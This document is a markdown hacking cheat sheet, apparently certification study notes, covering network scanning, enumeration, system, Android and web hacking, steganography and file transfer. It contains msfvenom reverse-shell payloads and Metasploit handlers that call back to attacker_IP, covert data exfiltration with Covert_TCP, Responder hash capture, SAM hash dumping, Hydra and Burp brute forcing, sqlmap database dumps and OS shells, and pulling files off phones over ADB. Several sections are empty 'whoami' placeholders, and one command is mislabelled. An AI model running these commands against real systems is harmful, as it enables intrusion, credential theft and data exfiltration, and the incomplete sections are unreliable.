# Network Hacking

<details>
<summary>Nmap</summary>

## Nmap

* Scan for a live host

```console
nmap -sP <TARGET>
nmap -sn <TARGET>
```

* Scan for open ports

```console
nmap -p --open <port> <TARGET>
```

* OS Detection

```console
nmap -p --open <port> <TARGET>
```

* Comprehensive scan.

```console
nmap -p- --open -vv -Pn <TARGET>
```
</details>

<details>
<summary>Nmap Scripts</summary>

## Nmap Scripts

* LDAP Enumeration.

```console
nmap -p 389 --script ldap-search <TARGET>
```
</details>

<details>
<summary>NetDiscover</summary>

## NetDiscover

* Perform an ARP scan across the entire network to identify live hosts.

```console
netdiscover -i eth0
netdiscover -r <TARGET>
```
</details>

<details>
<summary>Wireshark</summary>

## Wireshark

* Wireshark offers the capability to reconstruct a stream of plain text protocol packets into a format that is easily readable by humans

```shell
select_packet > follow > TCP Stream
```

* Filter by an specific HTTP Method

```shell
http.request.method == POST
http.request.method == GET
```

* Trace a DOS/DDOS attack

```shell
# Sort by packets in IPv4 based on number of the packets transfer
Statistics > Conversations > IPv4 > Packets
```

* Detect ARP Poisoning

```shell
Open Wireshark > Edit > Preferences > Protocols > ARP/RARP > Detect ARP Request Storms > Detect duplicate IP address > Start Capture > Analyze Expert information
```

</details>

<details>
<summary>CovertTCP</summary>

## CovertTCP

CovertTCP conceals transmission of data inside the IP header.
* [Covert_TCP](Covert_TCP.c) 

This can be used to analyze .cap files. It traverses through each line in Wireshark, targeting the identification field. Keep an eye on Hex value and ANSI value. Download and compile it.

```console
# Compiling Covert_TCP.c
cc -o covert_tcp covert_tcp.c
```

Now, specify the reciever machine (Client_IP). 

```console
sudo ./covert_tcp -dest Client_IP -source Attacker_IP -source_port 9999 -dest_port 8888 -server -file recieve.txt
```

Specifying the attacker machine (Attacker_IP). Create the message file that will be need to be transfered (ex. secret.txt)

```console
sudo ./covert_tcp -dest Client_IP -source Attacker_IP -source_port 8888 -dest_port 9999 -file secret.txt
```
The secret message is sent using Covert_TCP nad it is then captured using Wireshark.

</details>

<details>
<summary>LLMNR/NBT-NS Poisoning</summary>

## LLMNR/NBT-NS Poisoning

The tool [Responder](https://github.com/lgandx/Responder)  servers as a rogue authentication server to capture hashes. Utilizing this method, one could obtain the password of a logged-in user who is attempting to access an unavailable shared resource.

* On Unix based systems

```console
# where -I = interface
responder -I eth0
```
On Windows, you could try to access shared resources. Logs are stored at usr/share/responder/logs/SMB. You can crack the hash using John The Ripper.

```console
john SMBfilename  
```
</details>

# Enumeration

</details>

<details>
<summary>SNMP Enumeration</summary>

## SNMP Enumeration

* Performing SNMP Enumeration

```shell
# Scanning the port
nmap -sU -p 161 <TARGET_IP>

# Brute forcing SNMP
nmap -sU -p 161 --script=snmp-brute <TARGET_IP>

# Metasploit Modules
use auxiliary/scanner/snmp/snmp_login | set RHOSTS | exploit
use auxiliary/scanner/snmp/snmp_enum | set RHOSTS | exploit
```
</details>

</details>

<details>
<summary>Enum4Linux</summary>

## Enum4Linux

* Performing Linux Enumeration.

```shell
Enum4linux [options] IP
enum4linux -u username -p password -U 10.10.10.12 | - u user -p pass -U get user list
enum4linux -u username -p password -o 10.10.10.12 | -o get OS info
enum4linux -u username -p password -P 10.10.10.12 | -P get password policy info
enum4linux -u username -p password -G 10.10.10.12 | -G get groups and members info
enum4linux -u username -p password -S 10.10.10.12 | -S get share list info
enum4linux -u username -p password -a 10.10.10.12 | -a get all simple enumeration data [-U -S -G -P -r -o -n -i]
```
</details>

# System Hacking

</details>

<details>
<summary>MSFVenom</summary>

## MSFVenom

* Creating a payload

```console
msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=attacker_IP LPORT=attacker_Port -o filename.exe
```

* Creating a reverse connection

```console
msfdb init && msfconsole 
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST = attacker-IP  
set LPORT = attacker-Port 
run
```

</details>

<details>
<summary>Dumping SAM Hashes</summary>

## Dumping SAM Hashes

* Windows stores passwords in LM and NTLM hash formats. You need admin level access to dump them.

```powershell
wmic useraccount get name,sid
```

* You can use Pwdump7 to dump the password hashes.

```powershell
# dumps a protected file
pwdump7.exe -d C:\lockedfile.dat backup-lockedfile.dat

# show password hashes
pwdump.exe

# export hashes to the path defined
Pwdump7.exe > C:\hashes.txt
```

</details>

<details>
<summary>OPHCrack</summary>

## OPHCrack

* Cracks passwords no longer than 14 characters using only alphanumeric characters.

```shell
Open x86 GUI Version > Load PWDUMP > Select the hashes.txt file > Vista Free > Install it where OPHCrack files are placed
```
</details>

<details>
<summary>Winrtgen</summary>

## Winrtgen

* Creates Rainbow Tables.

```shell
Add Table > Hash NTLM > Min Length 4 > Max Length 6 > Chain Count 4000000 > CharSet LowerAlpha > Click Ok to start > Table is saved in Winrtgen folder
```
</details>

<details>
<summary>Rainbow Crack</summary>

## Rainbow Crack

* Cracking NTLM Hashes.

```shell
Open rcrack_gui.exe > File > Load NTLM Hashes from PWDUMP > Open Hashes.txt
Rainbow Table > Select Rainbow Table > Select Table created by Winrtgen > Crack
```
</details>

<details>
<summary>L0phtCrack</summary>

## L0phtCrack

* Add a brief description.

```console
# And some code
whoami
```
</details>

# Android Hacking

<details>
<summary>Phonesploit</summary>

## Phonesploit

* Installing Phonesploit.

```shell
git clone https://github.com/aerosol-can/PhoneSploit
cd PhoneSploit
pip3 install colorama

# Alternative
python3 -m pip install colorama
```

* Running Phonesploit.

```shell
python3 phonesploit.py
```

* To establish a connection with a new phone, choose option 3 and press Enter. Alternatively, you can enter the IP of the Android device.
* Then choose option 4 to access shell on the phone
* Download desired files using option 9

```shell
sdcard/Download/secret.txt
```

</details>

<details>
<summary>ADB</summary>

## ADB

* Installing ADB

```console
apt-get update
sudo apt-get install adb -y
adb devices -l
```

* Establishing a connection

```console
adb connect IP_ADDRESS:5555
adb devices -l
adb shell  
```

* Navigation

```console
pwd
ls
cd Download
ls
cd sdcard
```

* Download a file from an Android device using ADB

```console
adb pull /sdcard/log.txt C:\Users\admin\Desktop\log.txt 
adb pull sdcard/log.txt /home/mmurphy/Desktop
```

</details>

# Password Cracking

<details>
<summary>WPScan</summary>

## WPScan

```shell
# Performs only user enumeration
wpscan --url http://example.com/ --enumerate u
```
</details>

<details>
<summary>Hydra</summary>

## Hydra

### SSH 

```shell
hydra -l username -P passwords.txt target ssh
```

### FTP

```shell
# If the service isn't running on the default port, use -s
hydra -l username -P passwords.txt ftp://target -s 221

# Use Get COMMAND to download a file
get file.txt .
```

### Telnet

```shell
hydra -l admin -P passwords.txt -o test.txt target telnet
```

</details>

# Web Hacking

<details>
<summary>NSLookup</summary>

## NSLookup

You can use NSLookup to find the IP Address of a website.

```console
nslookup www.example.com
```
</details>

<details>
<summary>WordPress</summary>

## WordPress

* List WordPress users using the public default REST API.

```consoole
https://wordpress-site.com/wp-json/wp/v2/users/
```
</details>

<details>
<summary>Banner Grabbing</summary>

## Telnet

```console
telnet www.moviescope.com 80

# Double enter
GET / HTTP/1.0
```

## whatweb

```console
# Default banner grabbing
whatweb www.example.com

# Verbose grabbing
whatweb -v www.example.com
```

## OpenSSL

You can perform banner grabbing over SSL using OpenSSL.

```console
# Install OpenSSL
sudo apt install openssl -y
openssl
s_client –host www.example.com -port 443
GET/HTTP/1.0
```

## Curl

```console
# HTTP Get request from a proxy
curl -x <proxy_IP>:8080 http://localhost/
```
</details>

<details>
<summary>Local File Inclusion</summary>

## Local File Inclusion

Create an PHP payload using msfvenom

```console
msfvenom -p php/meterpreter/reverse_tcp lhost=attacker-ip lport=attacker-port -f raw
```

Create the Reverse Shell with Metasploit

```console
msfconsole
use exploit/multi/handler
set payload php/meterepreter/reverse_tcp
set LHOST = attacker-ip
set LPORT = attcker-port
run
```

</details>

<details>
<summary>Web Spidering</summary>

## zaproxy

You can perform web spidering using zaproxy.

```shell
Automated Scan > http://www.example.com > Attack > Active Scan > Spider Tab > Alerts > Spider > Messages
```
</details>

<details>
<summary>Burpsuite</summary>

## Brute Forcing with Burpsuite

* You can perform a brute force attack using Burpsuite. 

```shell
# First, set up the Proxy.
Firefox Preferences > Proxy > Settings > Manual Proxy > 127.0.0.1 and Port 8080 > Check "Also use this proxy for FTP and HTTPS" > Ok

# Then fire up Burpsuite
Proxy > "Intercept On" > Switch to Firefox -> Go to the target website > Enter Random Credentials > Switch to Burpsuite

# Setting the payloads
Right click > Send to intruder > Intruder > Positions > Clear  > Cluster bomb under Attack type

# Username and password payload
Select the username > Add Payload > Select the Password > Add Payload

# Go to the payload tab
Payloads Tab > Payload set: 1 and type: Simple list 

# Under Payload options
Load > Select a wordlist like username.txt

# Do the same for the password
Payload set: 2 and type: Simple list > Under Payload options > Load > Select a wordlist like password.txt > Start attack
```

When finished, look at the status code of every attempt. 

</details>

<details>
<summary>SQLMap</summary>

## SQLMap

* List databases

```console
sqlmap -u "http://domain.com/path.aspx?id=1" --cookie="Cookie"; --dbs
```

* Alternative

```console
  sqlmap -u "http://domain.com/path.aspx?id=1" --cookie="Cookie"; --data="id=1&Submit=Submit" --dbs  
```

* Listing tables of a database name

```console
  sqlmap -u "http://domain.com/path.aspx?id=1" --cookie="Cookie"; -D database_name -T target_Table --columns
```

* Listing the columns of such table

```console
  sqlmap -u "http://domain.com/path.aspx?id=1" --cookie="Cookie"; -D database_name --tables
```

* Dump data

```console
  sqlmap -u "http://domain.com/path.aspx?id=1" --cookie="Cookie"; -D database_name -T target_Table --dump
```

* Setting OS Shell

```console
sqlmap -u "http://domain.com/path.aspx?id=1" --cookie="Cookie"; ui-tabs-1=0 --os-shell
```

</details>

<details>
<summary>DLSS</summary>

## DLSS

Damn Small SQLi Scanner (DSSS) is a comprehensive tool designed for detecting SQL injection vulnerabilities. It is fully functional and capable of scanning both GET and POST parameters. Regarding optional configurations, it provides support for HTTP proxy along with HTTP header values such as User-Agent, Referer, and Cookie.

```console
python3 dsss.py -u "URL" --cookie="cookie"

# Then open the generated URL

```
</details>

# Steganography

<details>
<summary>Snow</summary>

## Snow

* Hide text

```console
snow.exe -c -p test -m "Secret Message" original.txt hide.txt
```

* Unhide text

```console
snow.exe -c -p test hide.txt
```

</details>

</details>

<details>
<summary>OpenStego</summary>

## OpenStego

Perform image steganography. To hide data, follow the next steps.

* Select text message file which you want to hide
* Select the cover file image where data is to be hidden
* Set output path and file name
* Set password if needed
* Click Hide Data

To extract data

* Open the steganography file.
* Set the output folder path
* Enter the password
* Extract Data


</details>

<details>
<summary>HashCalc</summary>

## HashCalc

* When opening the file, ensure MD5, SHA1, RIPEMD160 and CRC32 are selected. Then compare the hash after modiying the file.

</details>

<details>
<summary>CrypTool</summary>

## CrypTool

* Data encryption with CrypTool.

```shell
# Encrypting file
File > New > Enter text > Encrypt > Symmetric (Modern) > RC2 > KEY 05 -> Encrypt

# Decrypting
File > Open > Decrypt > Symmetric (Modern) > RC2 > KEY 05 > Decrypt
```
</details>

<details>
<summary>HashMyFile</summary>

## HashMyFile

* Add a brief description.

```console
# And some code
whoami
```
</details>

<details>
<summary>MD5 Calculator</summary>

## MD5 Calculator

* Integrates with file explore. Right click any file and select MD5 Calculator to calculate its MD5 Hash.

```console
# And some code
whoami
```
</details>

<details>
<summary>VeraCrypt</summary>

## VeraCrypt

* Add a brief description.

```console
# And some code
whoami
```
</details>

<details>
<summary>BCTextEncoded</summary>

## BCTextEncoded

* Simple GUI, enter the text and encode it using a password.

</details>

<details>
<summary>Keywords</summary>

## Keywords

* Image hidden > OpenStego
* File .hex > CrypTool
* Whitespace > Snow
* MD5 > HashCalc & MD5 Calculator
* Volume & Mount > VeraCrypt

</details>

<details>
<summary>CryptoForge</summary>

## Hacking Tool

* Add a brief description.

```console
# And some code
whoami
```
</details>

<details>
<summary>Hacking Tool</summary>

## Hacking Tool

* Add a brief description.

```console
# And some code
whoami
```
</details>

<details>
<summary>Hacking Tool</summary>

## Hacking Tool

* Add a brief description.

```console
# And some code
whoami
```
</details>

<details>
<summary>Hacking Tool</summary>

## Hacking Tool

* Add a brief description.

```console
# And some code
whoami
```
</details>

# Transfering Files

<details>
<summary>Apache</summary>

## Hacking Tool

* You can transfer local payloads to Windows using this way.

```shell
mkdir /var/www/html/share
chmod -R 755 /var/www/html/share
chown -R www-data:www-data /var/www/html/share
cp /root/Desktop/filename /var/www/html/share/
service apache2 start 
service apache2 status
```

* Then to download open a browser

```console
attacker_ip/share
```

* Windows to Linux > File System > Network > smb//Windows_IP

</details>

<details>
<summary>SimpleHTTPServer</summary>

## SimpleHTTPServer

* Starts a simple HTTP server for file sharing

```shell
python -m SimpleHTTPServer
```
</details>

## Extra Resources

<details>
<summary>Resources</summary>

## Resources

* Add a brief description.

```console
# And some code
whoami
```
</details>

